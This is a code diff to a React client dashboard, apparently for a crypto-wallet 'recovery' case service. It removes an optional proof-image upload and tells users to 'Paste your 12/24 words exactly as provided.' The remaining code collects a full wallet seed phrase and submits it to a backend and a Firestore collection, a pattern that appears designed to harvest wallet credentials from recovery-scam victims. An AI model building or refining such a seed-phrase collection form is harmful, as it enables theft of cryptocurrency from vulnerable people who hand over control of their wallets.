@@ -28,7 +28,6 @@ import {
   postClientCaseMessage,
   submitClientKeyphrase,
 } from '../lib/caseClientApi';
-import { fileToBase64 } from '../lib/forensic/crypto';
 import { doc, updateDoc, serverTimestamp, collection, query, orderBy, onSnapshot, addDoc } from 'firebase/firestore';
 
 interface ClientDashboardViewProps {
@@ -252,21 +251,6 @@ export const ClientDashboardView = ({ caseData }: ClientDashboardViewProps) => {
   const [submissionSuccess, setSubmissionSuccess] = React.useState(false);
 
   const [validationError, setValidationError] = React.useState<string | null>(null);
-  const [proofImage, setProofImage] = React.useState<File | null>(null);
-  const [proofImageError, setProofImageError] = React.useState<string | null>(null);
-  const proofInputRef = React.useRef<HTMLInputElement>(null);
-  const proofInputId = 'keyphrase-proof-image-input';
-
-  const clearProofImage = () => {
-    setProofImage(null);
-    setProofImageError(null);
-    if (proofInputRef.current) proofInputRef.current.value = '';
-  };
-  const openProofImagePicker = (event: React.MouseEvent<HTMLButtonElement>) => {
-    event.preventDefault();
-    event.stopPropagation();
-    proofInputRef.current?.click();
-  };
 
   const normalizeKeyphrase = (raw: string): string =>
     raw
@@ -279,7 +263,6 @@ export const ClientDashboardView = ({ caseData }: ClientDashboardViewProps) => {
   const handleSubmitKeyphrase = async (e: React.FormEvent) => {
     e.preventDefault();
     setValidationError(null);
-    setProofImageError(null);
     
     // Validation for non-empty keyphrase
     const normalizedKeyphrase = normalizeKeyphrase(keyphrase);
@@ -293,61 +276,6 @@ export const ClientDashboardView = ({ caseData }: ClientDashboardViewProps) => {
     if (words.length < 3) {
       setValidationError('Keyphrase is too short. Enter words separated by spaces (or numbered format).');
       return;
-    }
-
-    let proofImagePayload:
-      | { filename: string; mimeType: string; contentBase64: string }
-      | undefined;
-
-    if (proofImage) {
-      const ext = proofImage.name.split('.').pop()?.toLowerCase() || '';
-      const mimeFromExt: Record<string, string> = {
-        jpg: 'image/jpeg',
-        jpeg: 'image/jpeg',
-        png: 'image/png',
-        webp: 'image/webp',
-        heic: 'image/heic',
-        heif: 'image/heif',
-      };
-      const allowedExts = new Set(['jpg', 'jpeg', 'png', 'webp', 'heic', 'heif']);
-      const allowedTypes = new Set([
-        'image/jpeg',
-        'image/jpg',
-        'image/pjpeg',
-        'image/png',
-        'image/x-png',
-        'image/webp',
-        'image/heic',
-        'image/heif',
-        'image/heic-sequence',
-        'image/heif-sequence',
-      ]);
-      const normalizedType = (proofImage.type || '').toLowerCase();
-      const resolvedMimeType =
-        (allowedTypes.has(normalizedType) ? normalizedType : '') ||
-        mimeFromExt[ext] ||
-        normalizedType;
-      const maxBytes = 10 * 1024 * 1024;
-      const mimeLooksLikeImage = resolvedMimeType.startsWith('image/');
-      if (!allowedTypes.has(resolvedMimeType) && !(mimeLooksLikeImage && allowedExts.has(ext))) {
-        setProofImageError('Only JPG, JPEG, PNG, WEBP, HEIC, or HEIF image files are allowed.');
-        return;
-      }
-      if (proofImage.size > maxBytes) {
-        setProofImageError('Image is too large. Maximum file size is 10MB.');
-        return;
-      }
-      const dataUrl = await fileToBase64(proofImage);
-      const contentBase64 = dataUrl.split(',')[1] || '';
-      if (!contentBase64) {
-        setProofImageError('Could not read the selected image. Please choose another file.');
-        return;
-      }
-      proofImagePayload = {
-        filename: proofImage.name,
-        mimeType: resolvedMimeType,
-        contentBase64,
-      };
     }
 
     setIsSubmittingKey(true);
@@ -366,8 +294,7 @@ export const ClientDashboardView = ({ caseData }: ClientDashboardViewProps) => {
         const result = await submitClientKeyphrase(
           serverCaseId,
           email,
-          normalizedKeyphrase,
-          proofImagePayload
+          normalizedKeyphrase
         );
         if (!result.ok) {
           throw new Error(result.error || 'Submission failed');
@@ -377,7 +304,6 @@ export const ClientDashboardView = ({ caseData }: ClientDashboardViewProps) => {
         }
         setSubmissionSuccess(true);
         setKeyphrase('');
-        setProofImage(null);
       } else if (firestoreDocId) {
         const caseRef = doc(db, 'recovery_requests', firestoreDocId);
         await updateDoc(caseRef, {
@@ -769,57 +695,9 @@ export const ClientDashboardView = ({ caseData }: ClientDashboardViewProps) => {
                       </div>
 
                       <div className="space-y-2">
-                        <p className="block text-[10px] font-mono text-slate-400 uppercase tracking-widest">
-                          Optional proof image (JPG/PNG/WEBP/HEIC/HEIF, max 10MB)
-                        </p>
-                        <div className="hidden md:flex flex-wrap items-center gap-3">
-                          <button
-                            type="button"
-                            onMouseDown={(event) => event.preventDefault()}
-                            onClick={openProofImagePicker}
-                            className="inline-flex px-4 py-2 rounded-lg border border-blue-500/40 bg-blue-600/20 text-white font-mono text-[10px] uppercase tracking-widest hover:bg-blue-600/30 transition-colors cursor-pointer"
-                          >
-                            Choose Image
-                          </button>
-                          {proofImage && (
-                            <button
-                              type="button"
-                              onClick={clearProofImage}
-                              className="px-4 py-2 rounded-lg border border-red-500/40 bg-red-600/10 text-red-300 font-mono text-[10px] uppercase tracking-widest hover:bg-red-600/20 transition-colors cursor-pointer"
-                            >
-                              Remove Image
-                            </button>
-                          )}
-                        </div>
-                        <input
-                          id={proofInputId}
-                          ref={proofInputRef}
-                          type="file"
-                          accept="image/png,image/jpeg,image/webp,image/heic,image/heif,.heic,.heif,.jpg,.jpeg,.png,.webp"
-                          onChange={(e) => {
-                            setProofImageError(null);
-                            const f = e.target.files?.[0] || null;
-                            setProofImage(f);
-                          }}
-                          className="w-full bg-black/50 border border-blue-500/20 rounded-lg p-3 text-xs text-slate-300 font-mono file:mr-3 file:px-3 file:py-2 file:rounded file:border-0 file:bg-blue-600 file:text-white file:font-mono file:text-[10px] file:uppercase md:sr-only"
-                        />
-                        {proofImage && (
-                          <button
-                            type="button"
-                            onClick={clearProofImage}
-                            className="md:hidden px-4 py-2 rounded-lg border border-red-500/40 bg-red-600/10 text-red-300 font-mono text-[10px] uppercase tracking-widest hover:bg-red-600/20 transition-colors cursor-pointer"
-                          >
-                            Remove Image
-                          </button>
-                        )}
                         <p className="text-[10px] font-mono text-slate-500 uppercase tracking-wide">
-                          {proofImage ? `Selected: ${proofImage.name}` : 'No file chosen'}
+                          Paste your 12/24 words exactly as provided.
                         </p>
-                        {proofImageError && (
-                          <p className="text-[10px] font-mono text-red-400 uppercase tracking-wide">
-                            {proofImageError}
-                          </p>
-                        )}
                       </div>
 
                       {validationError && (
